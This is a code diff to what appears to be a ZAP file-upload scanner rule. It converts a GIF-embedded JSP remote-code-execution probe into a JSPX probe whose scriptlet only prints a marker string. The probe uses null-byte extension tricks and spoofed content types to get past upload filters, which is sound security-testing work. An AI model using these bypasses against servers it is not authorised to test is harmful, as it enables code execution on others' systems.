@@ -11,79 +11,82 @@
  * express or implied. See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package org.sasanlabs.fileupload.attacks.impl;
+package org.sasanlabs.fileupload.attacks.rce.jsp;
 
 import static org.sasanlabs.fileupload.Constants.NULL_BYTE_CHARACTER;
 
 import java.io.IOException;
-import java.nio.charset.Charset;
-import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
-import java.util.Base64;
 import java.util.List;
-import org.parosproxy.paros.network.HttpMessage;
 import org.sasanlabs.fileupload.Constants;
 import org.sasanlabs.fileupload.attacks.AttackVector;
 import org.sasanlabs.fileupload.attacks.FileUploadAttackExecutor;
-import org.sasanlabs.fileupload.attacks.FileUploadException;
 import org.sasanlabs.fileupload.attacks.beans.FileExtensionOperation;
 import org.sasanlabs.fileupload.attacks.beans.FileParameter;
-import org.sasanlabs.fileupload.matcher.impl.ContainsExpectedValueMatcher;
+import org.sasanlabs.fileupload.exception.FileUploadException;
+import org.sasanlabs.fileupload.matcher.ContentMatcher;
+import org.sasanlabs.fileupload.matcher.impl.MD5HashResponseMatcher;
 
-/** @author preetkaran20@gmail.com KSASAN */
-public class ImageBasedJSPRemoteCodeExecution implements AttackVector {
+/** @author KSASAN preetkaran20@gmail.com */
+public class PlainOldJSPXRemoteCodeExecution implements AttackVector {
 
-    private static final String GIF_IMAGE_JSP_INJECTED_IN_EXIF_BASE64_ENCODED =
-            "R0lGODlhAQABAHAAACH5BAUAAAAAIf4mPCU9ICJTYXNhbkxhYnNfIiArICJaQVBfSWRlbnRpZmllciIgJT4ALAAAAAABAAEAAAICRAEAOw==";
-    // Need to correct expected value these
-    private static final String EXPECTED_VALUE = "SasanLabs_ZAP_Identifier";
-    private static final String BASE_FILE_NAME = "ImageBasedJSPRCE_";
+    private static final String JSPX_UPLOADED_FILE_BASE_NAME = "PlainOldJSPXRemoteCodeExecution_";
+    // Payload from resource file: "jspx_payload.jspx"
+    private static final String JSPX_PAYLOAD =
+            "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"  version=\"1.2\"> \n"
+                    + "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" /> \n"
+                    + "<jsp:scriptlet> \n"
+                    + "    out.print(\"PlainOldJSPXRemoteCodeExecution_\"); \n"
+                    + "	 out.print(\"SasanLabs_ZAP_Identifier\");"
+                    + "</jsp:scriptlet> \n"
+                    + "</jsp:root>";
 
+    private static final ContentMatcher CONTENT_MATCHER =
+            new MD5HashResponseMatcher("PlainOldJSPXRemoteCodeExecution_SasanLabs_ZAP_Identifier");
+
+    // Need to validate
+    // application/x-httpd-jsp
+    // text/x-jsp
     private static final List<FileParameter> FILE_PARAMETERS =
             Arrays.asList(
-                    new FileParameter("jsp", Constants.EMPTY_STRING),
-                    new FileParameter("jsp", "application/x-jsp"),
+                    new FileParameter("jspx", Constants.EMPTY_STRING),
+                    new FileParameter("jspx", "application/x-jsp"),
                     new FileParameter(
-                            "jsp",
+                            "jspx",
                             Constants.EMPTY_STRING,
                             FileExtensionOperation.PREFIX_ORIGINAL_EXTENSION),
                     new FileParameter(
-                            "jsp",
+                            "jspx",
                             "application/x-jsp",
                             FileExtensionOperation.PREFIX_ORIGINAL_EXTENSION),
                     new FileParameter(
-                            "jsp" + NULL_BYTE_CHARACTER,
+                            "jspx" + NULL_BYTE_CHARACTER,
                             Constants.EMPTY_STRING,
                             FileExtensionOperation.SUFFIX_ORIGINAL_EXTENSION),
                     new FileParameter(
-                            "jsp" + NULL_BYTE_CHARACTER,
+                            "jspx" + NULL_BYTE_CHARACTER,
                             "application/x-jsp",
                             FileExtensionOperation.SUFFIX_ORIGINAL_EXTENSION));
 
     @Override
     public boolean execute(FileUploadAttackExecutor fileUploadAttackExecutor)
             throws FileUploadException {
+        boolean result = false;
         try {
-            byte[] imagePayload =
-                    Base64.getDecoder().decode(GIF_IMAGE_JSP_INJECTED_IN_EXIF_BASE64_ENCODED);
-            HttpMessage originalMessage = fileUploadAttackExecutor.getOriginalHttpMessage();
-            String charSet = originalMessage.getRequestHeader().getCharset();
-            Charset requestCharSet =
-                    charSet != null ? Charset.forName(charSet) : StandardCharsets.ISO_8859_1;
-            String requestPayload = new String(imagePayload, requestCharSet);
-            System.out.print(charSet);
-            if (this.genericAttackExecutor(
-                    fileUploadAttackExecutor,
-                    new ContainsExpectedValueMatcher(EXPECTED_VALUE),
-                    requestPayload,
-                    BASE_FILE_NAME,
-                    FILE_PARAMETERS)) {
+            result =
+                    this.genericAttackExecutor(
+                            fileUploadAttackExecutor,
+                            CONTENT_MATCHER,
+                            JSPX_PAYLOAD,
+                            JSPX_UPLOADED_FILE_BASE_NAME,
+                            FILE_PARAMETERS);
+            if (result) {
                 fileUploadAttackExecutor
                         .getFileUploadScanRule()
                         .raiseAlert(
                                 1,
                                 1,
-                                this.getClass().getName(),
+                                "",
                                 "",
                                 "",
                                 "",
@@ -95,6 +98,6 @@ public class ImageBasedJSPRemoteCodeExecution implements AttackVector {
         } catch (IOException e) {
             throw new FileUploadException(e);
         }
-        return false;
+        return result;
     }
 }
